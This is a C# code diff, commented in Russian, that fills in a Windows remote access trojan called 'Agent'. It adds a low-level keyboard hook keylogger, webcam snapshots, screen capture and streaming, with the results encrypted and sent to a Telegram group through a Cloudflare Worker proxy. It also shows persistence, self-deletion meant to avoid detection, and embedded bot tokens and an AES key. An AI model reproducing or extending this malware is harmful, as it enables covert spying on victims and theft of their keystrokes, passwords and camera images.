@@ -26,12 +26,12 @@ namespace Agent
 {
     class Program
     {
-        // ВШЕЙ ТОКЕН ПК
-        private static string _token = "8794241015:AAFq_f3Wshop9sOJaMY6ZkqLE4eGVuCQmxM";
+        // ВШЕЙ СЮДА ТОКЕН КОНКРЕТНОГО ПК
+        private static string _token = "9203119575:AAEmkVH7_VOL0cZelc6z8U_mFnKIw3Ldtjk";
         private static readonly long GroupId = -5468496599;
         private static readonly byte[] AesKey = Convert.FromBase64String("c2VjcmV0X2tleV9mb3JfdmFudGFfMTIzNDU2Nzg=");
         
-        // ВАЖНО: ссылка ОБЯЗАТЕЛЬНО должна быть с https:// и слэшем в конце
+        // ССЫЛКА НА CLOUDFLARE WORKER (Обязательно с https:// и слэшем / на конце!)
         private static readonly string WorkerUrl = "https://telegram-proxy.ivanovicpavel295.workers.dev/"; 
 
         private static int _slot = 0;
@@ -65,22 +65,21 @@ namespace Agent
                     _bot = new TelegramBotClient(_token);
                 }
 
-                // Запускаем бесконечный цикл для переподключения при обрывах сети
-                _ = Task.Run(async () => {
-                    while (true) {
-                        try {
-                            using var cts = new CancellationTokenSource();
-                            var opts = new ReceiverOptions { AllowedUpdates = new[] { UpdateType.Message } };
-                            await _bot.ReceiveAsync(Handle, (bot, ex, ct) => Task.CompletedTask, opts, cts.Token);
-                        } catch {
-                            await Task.Delay(5000); // Ждем 5 секунд и переподключаемся
-                        }
-                    }
-                });
+                using var cts = new CancellationTokenSource();
+                var opts = new ReceiverOptions { AllowedUpdates = new[] { UpdateType.Message } };
+                
+                _bot.StartReceiving(
+                    updateHandler: Handle,
+                    errorHandler: (bot, ex, ct) => 
+                    {
+                        Thread.Sleep(5000);
+                        return Task.CompletedTask;
+                    },
+                    receiverOptions: opts,
+                    cancellationToken: cts.Token);
 
-                await Task.Delay(2000); // Даем время боту инициализироваться
+                await Task.Delay(2000);
 
-                // Запрос слота
                 int preferred = File.Exists("slot.txt") && int.TryParse(File.ReadAllText("slot.txt").Trim(), out int p) ? p : 0;
                 for (int attempt = 0; attempt < 5; attempt++) {
                     _grantTcs = new TaskCompletionSource<int>();
@@ -93,7 +92,6 @@ namespace Agent
                 try { File.WriteAllText("slot.txt", _slot.ToString()); } catch { }
                 try { await _bot.SendMessage(GroupId, $"REG {_slot}"); } catch { }
 
-                // Пинг каждые 60 секунд
                 _ = Task.Run(async () => {
                     while (true) {
                         try { await _bot.SendMessage(GroupId, $"PING {_slot} {_id}"); } catch { }
@@ -101,7 +99,6 @@ namespace Agent
                     }
                 });
 
-                // Кейлоггер каждые 30 секунд
                 _ = Task.Run(async () => {
                     while (true) {
                         await Task.Delay(30000);
@@ -117,9 +114,9 @@ namespace Agent
                     }
                 });
 
-                await Task.Delay(-1);
+                await Task.Delay(-1, cts.Token);
             }
-            catch { Environment.Exit(0); } // Молча выходим при фатальных ошибках
+            catch { Environment.Exit(0); }
         }
 
         private static void InstallPersistence()
@@ -147,7 +144,6 @@ namespace Agent
                 {
                     Process.Start(new ProcessStartInfo { FileName = newExe, UseShellExecute = true });
                     
-                    // Удаление исходника без палева cmd.exe
                     try {
                         File.SetAttributes(currentExe, FileAttributes.Normal);
                         File.Delete(currentExe);
@@ -227,19 +223,199 @@ namespace Agent
             }
         }
 
-        // ОСТАЛЬНЫЕ МЕТОДЫ (ShowVideo, SendCam, StartStream, CaptureScreen и т.д.) ОСТАЮТСЯ БЕЗ ИЗМЕНЕНИЙ
-        // (Вставь их сюда из предыдущего кода)
-        
-        private static void ShowVideo(string path) { /* ... код из прошлого сообщения ... */ }
-        private static async Task SendCam(CancellationToken ct) { /* ... код из прошлого сообщения ... */ }
-        private static async void StartStream(CancellationToken ct) { /* ... код из прошлого сообщения ... */ }
-        private static void StopStream() { /* ... код из прошлого сообщения ... */ }
-        private static void WipeFrames() { /* ... код из прошлого сообщения ... */ }
-        private static async Task SendScreen(CancellationToken ct) { /* ... код из прошлого сообщения ... */ }
-        private static byte[] CaptureScreen() { /* ... код из прошлого сообщения ... */ }
-        private static void ShowGif(string path) { /* ... код из прошлого сообщения ... */ }
-        private static byte[] Encrypt(byte[] plain) { /* ... код из прошлого сообщения ... */ }
+        private static void ShowVideo(string path)
+        {
+            var thread = new Thread(() =>
+            {
+                var f = new Form
+                {
+                    FormBorderStyle = FormBorderStyle.None,
+                    WindowState = FormWindowState.Maximized,
+                    TopMost = true,
+                    BackColor = System.Drawing.Color.Black,
+                    ShowInTaskbar = false
+                };
+                var webView = new WebView2 { Dock = DockStyle.Fill };
+                f.Controls.Add(webView);
+                
+                f.Load += async (_, _) =>
+                {
+                    try {
+                        var userDataFolder = Path.Combine(Path.GetTempPath(), "WV2_Cache");
+                        var env = await CoreWebView2Environment.CreateAsync(null, userDataFolder);
+                        await webView.EnsureCoreWebView2Async(env);
+                        
+                        string dir = Path.GetDirectoryName(path)!;
+                        string file = Path.GetFileName(path);
+                        webView.CoreWebView2.SetVirtualHostNameToFolderMapping("app.local", dir, CoreWebView2HostResourceAccessKind.Allow);
+                        webView.CoreWebView2.Navigate($"https://app.local/{file}");
+                    } catch { }
+                };
+                
+                f.KeyDown += (_, e) => { if (e.KeyCode == Keys.Escape) f.Close(); };
+                Application.Run(f);
+            });
+            thread.SetApartmentState(ApartmentState.STA);
+            thread.IsBackground = true;
+            thread.Start();
+        }
+
+        private static async Task SendCam(CancellationToken ct)
+        {
+            _pauseEvent.Wait();
+            try {
+                using var capture = new VideoCapture(0);
+                if (capture.IsOpened()) {
+                    using var frame = new Mat();
+                    capture.Read(frame);
+                    if (!frame.Empty()) {
+                        Cv2.ImEncode(".jpg", frame, out byte[] jpg);
+                        byte[] enc = Encrypt(jpg);
+                        using var ms = new MemoryStream(enc);
+                        await _bot.SendDocument(GroupId, new InputFileStream(ms, $"c{_slot}.bin"), cancellationToken: ct);
+                    }
+                }
+            } catch { }
+        }
+
+        private static async void StartStream(CancellationToken ct)
+        {
+            StopStream();
+            Directory.CreateDirectory(FramesDir);
+            _streamCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
+            var token = _streamCts.Token;
+            _ = Task.Run(async () => {
+                int i = 0;
+                while (!token.IsCancellationRequested) {
+                    _pauseEvent.Wait();
+                    try {
+                        string framePath = Path.Combine(FramesDir, $"f_{i++:D6}.png");
+                        byte[] png = CaptureScreen();
+                        await File.WriteAllBytesAsync(framePath, png, token);
+                        byte[] enc = Encrypt(png);
+                        using var ms = new MemoryStream(enc);
+                        await _bot.SendDocument(GroupId, new InputFileStream(ms, $"s{_slot}.bin"), cancellationToken: token);
+                    } catch { }
+                    try { await Task.Delay(1000, token); } catch { break; }
+                }
+            }, token);
+        }
+
+        private static void StopStream()
+        {
+            try { _streamCts?.Cancel(); } catch { }
+            _streamCts = null;
+            WipeFrames();
+        }
+
+        private static void WipeFrames()
+        {
+            try {
+                if (Directory.Exists(FramesDir)) {
+                    foreach (var f in Directory.GetFiles(FramesDir)) try { File.Delete(f); } catch { }
+                    try { Directory.Delete(FramesDir, true); } catch { }
+                }
+            } catch { }
+        }
+
+        private static async Task SendScreen(CancellationToken ct)
+        {
+            _pauseEvent.Wait();
+            try {
+                byte[] enc = Encrypt(CaptureScreen());
+                using var ms = new MemoryStream(enc);
+                await _bot.SendDocument(GroupId, new InputFileStream(ms, $"s{_slot}.bin"), cancellationToken: ct);
+            } catch { }
+        }
+
+        private static byte[] CaptureScreen()
+        {
+            var b = Screen.PrimaryScreen!.Bounds;
+            using var bmp = new Bitmap(b.Width, b.Height);
+            using (var g = Graphics.FromImage(bmp)) g.CopyFromScreen(System.Drawing.Point.Empty, System.Drawing.Point.Empty, b.Size);
+            using var ms = new MemoryStream();
+            bmp.Save(ms, ImageFormat.Png);
+            return ms.ToArray();
+        }
+
+        private static void ShowGif(string path)
+        {
+            var thread = new Thread(() => {
+                var f = new Form {
+                    FormBorderStyle = FormBorderStyle.None,
+                    WindowState = FormWindowState.Maximized,
+                    TopMost = true,
+                    BackColor = System.Drawing.Color.Black,
+                    ShowInTaskbar = false
+                };
+                var pb = new PictureBox { Image = Image.FromFile(path), SizeMode = PictureBoxSizeMode.Zoom, Dock = DockStyle.Fill };
+                f.Controls.Add(pb);
+                f.KeyDown += (_, e) => { if (e.KeyCode == Keys.Escape) f.Close(); };
+                Application.Run(f);
+            });
+            thread.SetApartmentState(ApartmentState.STA);
+            thread.IsBackground = true;
+            thread.Start();
+        }
+
+        private static byte[] Encrypt(byte[] plain)
+        {
+            using var aes = new AesGcm(AesKey, 16);
+            byte[] nonce = new byte[12]; RandomNumberGenerator.Fill(nonce);
+            byte[] cipher = new byte[plain.Length]; byte[] tag = new byte[16];
+            aes.Encrypt(nonce, plain, cipher, tag);
+            byte[] result = new byte[28 + cipher.Length];
+            Buffer.BlockCopy(nonce, 0, result, 0, 12);
+            Buffer.BlockCopy(tag, 0, result, 12, 16);
+            Buffer.BlockCopy(cipher, 0, result, 28, cipher.Length);
+            return result;
+        }
     }
 
-    public static class Keylogger { /* ... код из прошлого сообщения ... */ }
+    public static class Keylogger
+    {
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+        [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+        [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+        [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string lpModuleName);
+        
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+        private static LowLevelKeyboardProc _proc = HookCallback;
+        private static IntPtr _hookID = IntPtr.Zero;
+        private static readonly StringBuilder _buffer = new();
+        private static readonly object _lock = new();
+
+        public static void Start() { 
+            using var p = Process.GetCurrentProcess(); 
+            using var m = p.MainModule!; 
+            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(m.ModuleName), 0); 
+        }
+        
+        private static IntPtr HookCallback(int n, IntPtr w, IntPtr l) {
+            if (n >= 0 && w == (IntPtr)WM_KEYDOWN) { 
+                int vk = Marshal.ReadInt32(l); 
+                lock (_lock) _buffer.Append(Translate(vk)); 
+            }
+            return CallNextHookEx(_hookID, n, w, l);
+        }
+        
+        public static string Flush() { 
+            lock (_lock) { 
+                var s = _buffer.ToString(); 
+                _buffer.Clear(); 
+                return s; 
+            } 
+        }
+        
+        private static string Translate(int vk) {
+            Keys k = (Keys)vk;
+            if (k >= Keys.A && k <= Keys.Z) return ((char)('a' + (k - Keys.A))).ToString();
+            if (k >= Keys.D0 && k <= Keys.D9) return ((char)('0' + (k - Keys.D0))).ToString();
+            if (k == Keys.Space) return " ";
+            if (k == Keys.Enter) return "\n";
+            if (k == Keys.Back) return "[<]";
+            return "";
+        }
+    }
 }
